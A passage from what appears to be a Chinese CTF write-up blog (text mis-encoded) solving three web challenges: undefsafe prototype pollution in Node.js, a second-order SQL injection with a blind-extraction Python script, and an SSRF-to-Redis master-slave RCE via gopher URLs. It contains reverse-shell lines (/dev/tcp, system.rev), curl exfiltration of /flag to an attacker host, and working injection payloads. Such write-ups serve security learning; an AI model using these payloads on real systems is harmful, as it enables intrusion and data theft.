class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>:<span class="hljs-number">2</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>));<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//æŠ¥é”™</span><br><span class="hljs-title function_">undef</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//ä¸å­˜åœ¨è¯¥å±æ€§åˆ™åˆ›å»ºï¼Œå­˜åœ¨åˆ™ä¿®æ”¹</span><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“çš„ä¾‹å­ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;rev1ve&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™toStringå±æ€§å°±è¢«æˆ‘ä»¬ä¿®æ”¹äº†ï¼Œé‚£ä¹ˆæ ¹æ®ä¸Šé¢çš„ä»£ç ä»–ä¼šå°†commandså¯¹è±¡æ‰€æœ‰çš„å±æ€§åˆ—å‡ºæ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ·»åŠ ä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„å±æ€§å€¼å³å¯ã€‚</p><p>èƒ½è®©æˆ‘ä»¬è¶³å¤Ÿè‡ªç”±ä¼ å‚æ•°çš„æ±¡æŸ“çš„å‡½æ•°å°±æ˜¯edit_note()</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨äº†è¯¥å‡½æ•°çš„ä½ç½®å°±åœ¨&#x2F;edit_noteè·¯ç”±</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬åªè¦æ§åˆ¶idä¸º__ proto __å³å¯æ±¡æŸ“ã€‚</p><p>è¿™é‡Œä¸€å¼€å§‹ä¼ äº†å‚æ•°å‘ç°ä¼šæŠ¥é”™ç»™æˆ‘æ•´ä¸ä¼šäº†</p><p><img src="http://cdn.clown2024.cn/202407151704590.png" alt="image-20240320173335763"></p><p>å»çœ‹äº†wpè¯´æŠ¥é”™ä¹Ÿä¸å½±å“ã€‚</p><p>é‚£æˆ‘å°±å…ˆè¯•äº†ä¸€ä¸‹æ±¡æŸ“æˆlsï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=ls&amp;raw=hhh<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704591.png" alt="image-20240320173550096"></p><p>ç„¶åç”¨äº†ä¸€ä¸‹curlæ˜¯èƒ½ç›‘å¬åˆ°çš„ï¼Œé‚£å°±å¯ä»¥ç›´æ¥åå¼¹shelläº†</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">id=__proto__&amp;author=bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&amp;raw=hhh<br></code></pre></td></tr></table></figure><blockquote><p>éš¾ç»·å¼¹ä¸å›æ¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œé‚£å°±ç”¨curlå§ã€‚ã€‚ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=curl &lt;ä¸»æœºip&gt; -d `cat /flag`&amp;raw=hhh<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704592.png" alt="image-20240320174451680"></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/m0_73512445/article/details/135079967">https://blog.csdn.net/m0_73512445/article/details/135079967</a></p><h1 id="ç½‘é¼æ¯-2018unfinish"><a href="#ç½‘é¼æ¯-2018-unfinish" class="headerlink" title="[ç½‘é¼æ¯ 2018]unfinish"></a>[ç½‘é¼æ¯ 2018]unfinish</h1><p>è¿™é¢˜çš„è€ƒç‚¹æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œè¿˜ä¸ä¼šäºŒæ¬¡æ³¨å…¥å…ˆå­¦ä¹ ä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p><blockquote><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯äºŒæ¬¡åˆ©ç”¨æ¶æ„æ•°æ®ï¼Œç¬¬ä¸€æ¬¡å‘é€çš„æ¶æ„æ•°æ®ç»è¿‡è½¬ä¹‰åå­˜å…¥æ•°æ®åº“ï¼Œä½†ä¹‹åä»æ•°æ®å–å‡ºæ•°æ®åˆ©ç”¨çš„æ—¶å€™å¹¶æ²¡æœ‰è½¬ä¹‰ï¼Œé‚£è¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„æ¶æ„æ•°æ®å°±ä¼šç”Ÿæ•ˆã€‚</p></blockquote><p>è¿›å»å°±ç»™äº†ä¸€ä¸ªlogin.phpï¼Œæ‰«äº†ä¸€ä¸‹å‘ç°è¿˜æœ‰register.php</p><p><img src="http://cdn.clown2024.cn/202407151704593.png" alt="image-20240326000952219"></p><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•è¿›å»ä¹‹åå°±æ˜¯ä¸€å¼ å›¾ç‰‡</p><p><img src="http://cdn.clown2024.cn/202407151704594.png" alt="image-20240326001047845"></p><p>å¯ä»¥çœ‹åˆ°ä¸Šå›¾çš„å·¦ä¾§ä¸­ä¼šå›æ˜¾ä¸€ä¸ªç”¨æˆ·åï¼Œè¿™å°±æ˜¯ç¬¬äºŒæ¬¡åˆ©ç”¨æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œé‚£åº”è¯¥å°±æ˜¯åœ¨æ³¨å†Œçš„ç”¨æˆ·åä¸ŠåŠ¨æ‰‹è„šäº†</p><p>åœ¨æ³¨å†Œé¡µé¢çš„ç”¨æˆ·åè¾“äº†ä¸€ä¸‹é€—å·å‘ç°è¢«è¿‡æ»¤äº†</p><p><img src="http://cdn.clown2024.cn/202407151704595.png" alt="image-20240326002729728"></p><p>é‚£æˆ‘ä»¬å°±å…ˆå»çˆ†ç ´ä¸€ä¸‹çœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆå…³é”®è¯</p><p><img src="http://cdn.clown2024.cn/202407151704596.png" alt="image-20240326003157517"></p><p>çœ‹åˆ°ä¼¼ä¹æ˜¯åªè¿‡æ»¤äº†informationå’Œé€—å·</p><p>çŒœæµ‹ä¸€ä¸‹sqlè¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select username from table where username = &#x27;ä¼ é€’çš„å‚æ•°&#x27;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å»æ³¨å†Œä¸€ä¸‹ç”¨æˆ·å0â€™ and â€˜1 çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°ç”¨æˆ·åå˜æˆäº†0ï¼Œå³å­˜åœ¨äºŒæ¬¡æ³¨å…¥</p><p><img src="http://cdn.clown2024.cn/202407151704597.png" alt="image-20240328145045188"></p><p>è¿™é‡Œå¯ä»¥äº†è§£ä¸€ä¸‹MySQLä¸­å­—ç¬¦ä¸²çš„è¿ç®—</p><p><img src="http://cdn.clown2024.cn/202407151704598.png" alt="image-20240328144630707"></p><p>æ‰§è¡Œselect â€˜0â€™+database()å˜æˆäº†0ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151704599.png" alt="image-20240328144719610"></p><p>ä¸è¿‡ç”¨ä¸‹é¢çš„æŸ¥è¯¢æ–¹å¼å°±èƒ½çŸ¥é“æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç </p><p><img src="http://cdn.clown2024.cn/202407151704600.png" alt="image-20240328144824861"></p><p>é¢˜ä¸­è¿‡æ»¤äº†é€—å·å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼</p><p><img src="http://cdn.clown2024.cn/202407151704601.png" alt="image-20240328144917362"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œå› ä¸ºè¿‡æ»¤äº†informationï¼Œæ‰€ä»¥wpçŒœæµ‹è¡¨åä¸ºflagï¼Œåªèƒ½è¯´å¾ˆçŒœè°œã€‚</p><p>é‚£è„šæœ¬å¦‚ä¸‹ï¼Œå› ä¸ºé‚®ç®±ä¸èƒ½é‡å¤æ³¨å†Œï¼Œæ‰€ä»¥æ¯æ¬¡æ³¨å†Œéƒ½è¦ä¸ä¸€æ ·ï¼ˆä¸æƒ³å†™äº†å·ä¸ªæ‡’ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># å–è¿”å›é¡µé¢æ•°æ®çš„span class=user-nameå±æ€§</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704602.png" alt="image-20240328150712672"></p><blockquote><p>ä¸è¿‡è¿˜æ˜¯è§‰å¾—å¾ˆå¥‡æ€ªï¼ŒæŒ‰ç…§ä¸Šé¢çš„æŸ¥è¯¢è¯­å¥ä¸åº”è¯¥æ˜¯ä¸ºç©ºå˜›æŸ¥è¯¢å‡ºæ¥çš„å€¼ï¼Ÿ</p><p>ç½‘ä¸Šä¹Ÿæ²¡æ‰¾åˆ°æºç ä¸æ¸…æ¥šå…·ä½“æ˜¯æ€ä¹ˆæ ·çš„</p></blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://juejin.cn/post/7158228802844229662#heading-1">https://juejin.cn/post/7158228802844229662#heading-1</a></p><h1 id="ç½‘é¼æ¯-2020-ç„æ­¦ç»„ssrfme"><a href="#ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe"></a>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</h1><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">// Please visit hint.php locally.</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®æœ€åä¸€å¥å°±æ˜¯è¦ä»æœ¬åœ°è®¿é—®hint.php</p><p>å…ˆåšä¸€ä¸‹ä»£ç å®¡è®¡ææ¸…æ¥šæµç¨‹ï¼Œé¦–å…ˆæ˜¯urlå‚æ•°è·å–è¦è¯·æ±‚çš„urlï¼Œç„¶åå»è¿›è¡Œå®‰å…¨è¯·æ±‚çš„å‡½æ•°æ‰§è¡Œï¼Œæ‰§è¡Œå‰ä¼šå…ˆåˆ¤æ–­æ˜¯å¦ä¸ºé»‘åå•é‡Œçš„ipï¼Œæ˜¯åˆ™ä¸è¯·æ±‚ï¼›è¯·æ±‚ä¹‹åä¼šè·å–urlçš„é‡å®šå‘å‚æ•°ï¼Œå¦‚æœæœ‰çš„è¯å°±ä¼šè¿›è¡Œé‡å®šå‘ã€‚</p><p>é‚£å°±å…ˆç»•ä¸€ä¸‹ipæ¥è¯»hint.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?url=http://0.0.0.0/hint.php<br></code></pre></td></tr></table></figure><p>è¯»å‡ºæ¥çš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæç¤ºäº†redisçš„å¯†ç æ˜¯rootï¼Œè¿™é¢˜çš„è€ƒç‚¹å°±æ˜¯redisæœ¬åœ°ä¸»ä»å¤åˆ¶çš„rce</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ­»äº¡ä»£ç ï¼Œå¯ä»¥ç»•è¿‡ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://xiaolong22333.top/archives/114/%EF%BC%8C%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E5%86%99shell%E7%9A%84%E6%9D%83%E9%99%90%EF%BC%8C%E5%86%99%E4%B8%8D%E8%BF%9B%E5%8E%BB">https://xiaolong22333.top/archives/114/ï¼Œä½†æ˜¯æ²¡æœ‰å†™shellçš„æƒé™ï¼Œå†™ä¸è¿›å»</a></p><p>ç°åœ¨å»è®¿é—®ä¸€ä¸‹6379ç«¯å£çœ‹çœ‹æƒ…å†µï¼Œç”¨dictåè®®å»çœ‹çœ‹</p><p><img src="http://cdn.clown2024.cn/202407151704603.png" alt="image-20240520144931871"></p><p>ç„¶åå¯ä»¥å‘ç°æ²¡æœ‰éªŒè¯ï¼Œéœ€è¦å¯†ç </p><p>æœ‰å…³ssrfæ‰“redisçš„åŸç†å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/5665?time__1311=n4+xnD07Dti=L4YqGNnmDUhDjhDRo4q7IKXKQx&alichlgref=https://www.google.com/%EF%BC%8Credis%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E9%87%87%E7%94%A8%E7%9A%84resp%E5%8D%8F%E8%AE%AE%E3%80%82">https://xz.aliyun.com/t/5665?time__1311=n4%2BxnD07Dti%3DL4YqGNnmDUhDjhDRo4q7IKXKQx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2Fï¼Œredisæ•°æ®ä¼ è¾“é‡‡ç”¨çš„respåè®®ã€‚</a></p><p>ä¸‹é¢å‚è€ƒè¿™ç¯‡æ–‡ç« æ¥æ‰“redisï¼š<a href="https://www.freebuf.com/articles/web/293030.html">https://www.freebuf.com/articles/web/293030.html</a></p><p>å› ä¸ºç”¨å¦ä¸€ç§æ–¹æ³•æ²¡æ‰“é€šå°±ç›´æ¥ç”¨è¿™ä¸ªä¸€æ­¥ä¸€æ­¥æ¥å¥½äº†</p><p>é¦–å…ˆèµ·ä¸€ä¸ªmasterï¼Œè¿™é‡Œç”¨çš„å·¥å…·æ˜¯ï¼š<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server%EF%BC%8C%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%9A%84vps%E8%B5%B7%EF%BC%8C%E7%AD%89%E4%BC%9A%E9%9D%B6%E6%9C%BA%E8%BF%9E%E6%8E%A5%E8%BF%99%E4%B8%AA%E8%AE%BE%E7%BD%AE%E4%B8%BB%E4%BB%8E%E5%85%B3%E7%B3%BB">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Serverï¼Œåœ¨è‡ªå·±çš„vpsèµ·ï¼Œç­‰ä¼šé¶æœºè¿æ¥è¿™ä¸ªè®¾ç½®ä¸»ä»å…³ç³»</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 redis_rogue_server.py -v -path exp.so -lport 8888<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢çš„æ–‡ç« æˆ‘ä»¬å¯ä»¥çŸ¥é“redisçš„respåè®®çš„ä¼ è¾“æ ¼å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨gopherä¸€æ­¥æ­¥æ¥è¿›è¡Œä¸»ä»å¤åˆ¶rce</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># è®¾ç½®å¤‡ä»½è·¯å¾„<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>config set dir /tmp/<br>quit<br><br># ä¿®æ”¹å¤‡ä»½æ–‡ä»¶åå­—ï¼Œè·Ÿè¿œç¨‹ä¸»æœºå»ºç«‹ä¸»ä»å…³ç³»ï¼Œè¿™é‡Œçš„ipå’Œç«¯å£ä¿®æ”¹ä¸ºä½ vpsçš„åœ°å€å’Œç«¯å£<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%25201.xx.xx.xx%252021000%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>config set dbfilename exp.so<br>slaveof 1.xx.xx.xx 21000<br>quit<br><br># åŠ è½½æ¨¡å—<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>module load ./exp.so<br>quit<br><br>#å…³é—­ä¸»ä»åŒæ­¥(å¯é€‰)<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>slaveof NO ONE<br>quit<br><br>#æ‰§è¡Œå‘½ä»¤è·å–flag<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>system.exec &quot;cat /flag&quot;<br>quit<br><br># ä¹Ÿå¯ä»¥åå¼¹shell<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.rev%25201.xx.xx.xx%25206666%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>system.rev 1.xx.xx.xx 6666<br>quit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704604.png" alt="image-20240520165854299"></p><p><img src="http://cdn.clown2024.cn/202407151704605.png" alt="image-20240520165906409"></p><p>è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ç”¨çš„æ˜¯è¿™ä¸¤ç§å·¥å…·ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/karsa/p/14123995.html">https://www.cnblogs.com/karsa/p/14123995.html</a></p><p><a href="https://github.com/xmsec/redis-ssrf">å·¥å…·ä¸€</a>ï¼Œ<a 